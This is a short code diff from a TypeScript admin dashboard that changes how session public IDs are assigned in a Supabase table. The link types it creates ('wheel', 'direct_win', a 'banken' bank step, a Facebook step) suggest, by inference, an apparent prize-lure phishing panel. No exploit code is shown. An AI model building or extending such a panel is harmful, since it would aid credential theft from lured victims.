@@ -394,28 +394,8 @@ export function AdminDashboardClean() {
     setCreateLinkError(null);
     setCreating(true);
 
-    // ADIM 1: KALICI SILINMIS (bosta) EN KUCUK public_id'yi bul (cakisma YOK)
-    let reusePublicId: number | null = null;
-    try {
-      const { data: usedRows } = await supabase
-        .from("sessions")
-        .select("public_id")
-        .not("public_id", "is", null);
-      const usedIds = new Set(
-        (usedRows || [])
-          .map((r) => Number((r as any).public_id))
-          .filter((n) => Number.isFinite(n) && n > 0)
-      );
-      for (let i = 1; i <= 100000; i++) {
-        if (!usedIds.has(i)) {
-          reusePublicId = i;
-          break;
-        }
-      }
-    } catch (_findErr) {
-      // public_id listesi okunamazsa sequence devam etsin (zarar yok)
-    }
-
+    // public_id DB sequence'e birakilir — manuel tarama replica'larda
+    // duplicate key (sessions_public_id_idx) yaratiyordu.
     const insertPayload: any = {
       amount: linkType === "wheel" ? 0 : (Number(amount.replace(",", ".")) || 0),
       current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : linkType === "direct_facebook" ? "facebook" : "code_entry",
@@ -429,11 +409,6 @@ export function AdminDashboardClean() {
       partner_name: "admin", // Admin dashboard'da şimdilik sabit
       participation_code: linkType === "normal" ? (participationCode.trim() || null) : null
     };
-
-    // Bosta ID varsa manuel public_id ata (yoksa PostgreSQL SEQUENCE otomatik uretir)
-    if (reusePublicId !== null) {
-      insertPayload.public_id = reusePublicId;
-    }
 
     const { data, error } = await supabase
         .from("sessions")
